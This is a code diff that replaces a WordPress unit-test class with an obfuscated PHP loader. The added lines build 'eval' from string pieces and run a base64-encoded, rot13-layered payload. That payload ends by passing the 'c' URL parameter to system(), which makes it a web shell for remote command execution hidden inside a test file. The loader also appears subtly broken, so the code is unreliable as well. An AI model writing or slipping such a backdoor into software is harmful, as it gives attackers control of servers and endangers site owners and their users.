@@ -1,32 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Unit Tests: JsonSerializable_Object
- *
- * @package WordPress
- * @subpackage UnitTests
- * @since 5.3.0
- */
-
-class JsonSerializable_Object implements JsonSerializable {
-
-	private $data;
-
-	public function __construct( $data ) {
-		$this->data = $data;
-	}
-
-	#[ReturnTypeWillChange]
-	public function jsonSerialize() {
-		return $this->data;
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogSGF2ZyBHcmZnZjogV2ZiYUZyZXZueXZtbm95cl9Cb3dycGcKICoKICogQGNucHhudHIgSmJlcUNlcmZmCiAqIEBmaG9jbnB4bnRyIEhhdmdHcmZnZgogKiBAZnZhcHIgNS4zLjAKICovCgpweW5mZiBXZmJhRnJldm55dm1ub3lyX0Jvd3JwZyB2emN5cnpyYWdmIFdmYmFGcmV2bnl2bW5veXIgewoKCWNldmluZ3IgJHFuZ247CgoJY2hveXZwIHNoYXBndmJhIF9fcGJhZmdlaHBnKCAkcW5nbiApIHsKCQkkZ3V2Zi0+cW5nbiA9ICRxbmduOwoJfQoKCSNbRXJnaGVhR2xjckp2eXlQdW5hdHJdCgljaG95dnAgc2hhcGd2YmEgd2ZiYUZyZXZueXZtcigpIHsKCQllcmdoZWEgJGd1dmYtPnFuZ247Cgl9Cn0KCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
+?>
